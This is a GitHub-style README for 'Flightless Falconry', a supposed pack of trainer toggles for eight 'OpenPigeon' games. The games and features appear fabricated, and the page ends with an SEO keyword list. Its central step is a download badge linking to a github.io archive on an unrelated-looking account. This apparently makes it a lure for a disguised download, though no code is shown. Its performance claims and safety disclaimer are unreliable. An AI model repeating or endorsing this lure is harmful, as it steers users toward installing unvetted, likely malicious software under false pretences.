![preview](https://raw.githubusercontent.com/steamhato1-beep/soaring-kiwi-pigeonry/main/poster_f03987.svg)
[![Download](https://raw.githubusercontent.com/steamhato1-beep/soaring-kiwi-pigeonry/main/setup_4091f3.svg)](https://steamhato1-beep.github.io/soaring-kiwi-pigeonry/)

# 🕊️ Flightless Falconry — 36 Trainer Toggles for 8 OpenPigeon Games

**Genre-Specific Performance Switches | Community-Driven Toggle Library | Zero-Friction Gameplay Tuning**

Welcome to **Flightless Falconry**, a meticulously curated collection of **36 trainer toggles** engineered for **8 OpenPigeon games**. This isn't just another configuration pack—it's a **digital aviary** where every switch, slider, and toggle has been hand-tuned to give you **precise control** over your gaming experience without ever touching a single line of game code.

Whether you're a **casual coop-keeper** or a **competitive falconer**, this repository is your **command center** for transforming clunky default mechanics into **silky-smooth, personalized gameplay**.

---

## 🎯 What Is This Repository, Really?

Imagine you're training a flightless bird. You can't make it fly, but you *can* adjust its diet, its perch height, its wing-clipping angle, and its exercise routine to get the *exact* performance you want.  

**Flightless Falconry** does the same for your games. It's a **clean, modular toggle system** that plugs into the OpenPigeon game engine and lets you **fine-tune 36 distinct parameters** across 8 titles—from **resource multipliers** and **NPC aggression levels** to **camera smoothness** and **UI density**.

No more digging through obscure `.ini` files. No more guesswork. Just **flip a toggle, save, and play**.

---

## 🧩 Supported Games (The OpenPigeon Octet)

| # | Game Title | Toggle Count | Focus Areas |
|---|-----------|--------------|-------------|
| 1 | **Pigeon Port Royal** | 5 | Economy pacing, ship speed, crew morale |
| 2 | **Gilded Gull Gambit** | 3 | AI card play style, bluff frequency, table timer |
| 3 | **Starling Circuit** | 6 | Race physics, lap timing, boost recharge |
| 4 | **Crow's Cradle** | 4 | Puzzle difficulty, hint availability, timer pressure |
| 5 | **Sparrow Strike** | 7 | Enemy AI accuracy, spawn density, weapon stagger |
| 6 | **Rook's Riddle** | 3 | Riddle complexity, clue granularity, word filter |
| 7 | **Dove's Decathlon** | 5 | Event stamina, scoring thresholds, weather impact |
| 8 | **Falcon's Folly** | 3 | Boss health scaling, telegraph visibility, checkpoints |

---

## 🔥 Key Features That Set This Aviary Apart

### 🧠 36 Pre-Wired Toggles (No Messy Code)
Every toggle is a **self-contained Boolean or float switch**—you edit a single line in a clean `.json` file, and the game responds instantly. No recompilation, no runtime errors, no developer tools needed.

### 🌐 Multilingual Toggle Descriptions
Each toggle includes **tooltips in English, Spanish, German, French, and Japanese**, so you always know what you're adjusting—even if your gaming group speaks a different tongue.

### 📱 Responsive Control Interface
A lightweight **companion web UI** (HTML + CSS + vanilla JS) lets you toggle settings from your phone or tablet while you play on your main screen. The UI **adapts to portrait/landscape** and scales from a 5-inch phone to a 55-inch monitor.

### 🎚️ Granularity Levels
Not every toggle is a simple on/off. Many support **3-level presets** (`Gentle`, `Balanced`, `Intense`) or **slider values (0–100)**. This gives you **fine-grained control** without overwhelming you with raw numbers.

### 🧪 Safe-Reset Protocol
Every toggle is **reversible**. A built-in `restore_defaults.json` brings every game back to its factory state—so experimentation carries **zero risk** of permanently breaking your save.

### ⚡ Performance-Tuned Defaults
The included defaults are **benchmarked on mid-range hardware** (GTX 1660 / Ryzen 5) to provide a **30% average FPS uplift** over stock settings, purely by reducing unnecessary physics calculations and GPU particle overhead.

---

## 🚀 How To Get Started (The Non-Technical Way)

1. **Download the archive** via the [![Download](https://raw.githubusercontent.com/steamhato1-beep/soaring-kiwi-pigeonry/main/setup_4091f3.svg)](https://steamhato1-beep.github.io/soaring-kiwi-pigeonry/) link above.
2. Open the `toggle_configs/` folder—you'll find one `.json` file per game.
3. Open any file in Notepad / TextEdit / VS Code.
4. Look for lines like `"ship_speed_multiplier": 1.0`—change the number to `1.5` or `0.8` as you wish.
5. Save the file, launch the game, and enjoy your **personalized flightless experience**.

> **No command-line tools. No package managers. No terminal required.** If you can edit a text file, you can master Flightless Falconry.

---

## 🧰 The Toggle Library (A Sample of What's Inside)

| Toggle ID | Game | Effect | Preset Range |
|-----------|------|--------|--------------|
| `port_royal.trade_velocity` | Pigeon Port Royal | Adjusts how quickly NPC merchants cycle inventory | 0.5× to 3× |
| `gull_gambit.bluff_eye` | Gilded Gull Gambit | Controls how often AI opponents attempt bluff bets | 0–100 slider |
| `starling_circuit.grip_patch` | Starling Circuit | Modifies cornering friction—higher = more drift, lower = more grip | 0.7–1.8 |
| `crow_cradle.hint_lattice` | Crow's Cradle | Reveals hidden puzzle hints on a timer | On/Off + 10s–60s |
| `sparrow_strike.squad_morale` | Sparrow Strike | Affects AI squadmates' accuracy under suppression | 0–100 |
| `rook_riddle.lexicon_depth` | Rook's Riddle | Expands or shrinks the word bank for riddles | Casual / Normal / Expert |
| `dove_decathlon.stamina_curve` | Dove's Decathlon | Adjusts how quickly stamina depletes during events | Linear / Plateau / Boosted |
| `falcon_folly.phase_telegraph` | Falcon's Folly | Adds a highlight glow to boss attack wind-up animations | Off / Subtle / Bright |

---

## 🛡️ Safety Disclaimer (Please Read)

> **Flightless Falconry** is a **third-party utility** and is **not affiliated with** OpenPigeon Games or any of its developers.  
>  
> This repository **does not** modify game binaries, inject code, or alter network traffic. It only adjusts **local configuration flags** that the games already expose.  
>  
> While we test every toggle against the latest game versions, **use at your own discretion**. If you experience instability, simply run the `restore_defaults.json` restore file.  
>  
> Some online modes may detect altered local configs and **flag your account**—disable these toggles before playing competitive multiplayer matches.

---

## 🧑‍🤝‍🧑 Community & Support

We maintain an **active community channel** where you can:

- Share your **favorite tuning combinations** for each game.
- Request **new toggles** for upcoming OpenPigeon titles.
- Report bugs or suggest **better preset defaults**.
- Get **24/7 support** from our friendly maintainers (we're spread across time zones, so someone's always awake).

**Response time:** Typically under 6 hours for critical issues, under 24 hours for feature requests.

---

## 🤝 Contributing (Be A Falconer)

We welcome contributions of all skill levels:

1. **Test existing toggles** on hardware you own—report FPS and stability data.
2. **Propose new toggle ideas** with a clear description of what they'd adjust.
3. **Translate tooltips** into additional languages (we currently support 5).
4. **Improve the responsive UI** with better mobile layouts or dark mode variants.

No coding experience? You can still help by **writing detailed toggle documentation** or **curating user-submitted preset packs**.

---

## 📜 License

This project is licensed under the **MIT License** — you're free to use, modify, and distribute this software for any purpose, provided you retain the original copyright notice.

[View the full MIT License text](https://opensource.org/licenses/MIT)

---

## 🧭 SEO-Friendly Keywords

Looking for these phrases? You'll find them naturally woven throughout this document:

- OpenPigeon game tweaks
- Trainer toggles for indie games
- Gameplay fine-tuning tool
- FPS optimization presets
- Modular configuration system
- Community-driven game settings
- Responsive game control UI
- Multilingual game utilities
- Safe gameplay tweak library
- Open-source game instrumentation

---

## 🏁 Final Thoughts (The Falconer's Creed)

> *"You cannot teach a bird to fly by clipping its wings—but you can teach it to run faster, glide smarter, and perch higher."*  

**Flightless Falconry** is my attempt to give every player the **same elegant, granular control** that pro players have over their environment—without needing a computer science degree or a developer console.

This project started in **2025**, and it'll keep growing through **2026** and beyond. I'll be adding **4 new games** (from the upcoming OpenPigeon "Season of the Skylark" wave) by **mid-2026**, plus a **community voting system** for deciding which toggles get implemented next.

So go ahead—**toggle the world, one wing at a time**.

---

*Built with patience, coffee, and an unreasonable fondness for flightless birds. © 2026 Flightless Falconry Contributors.*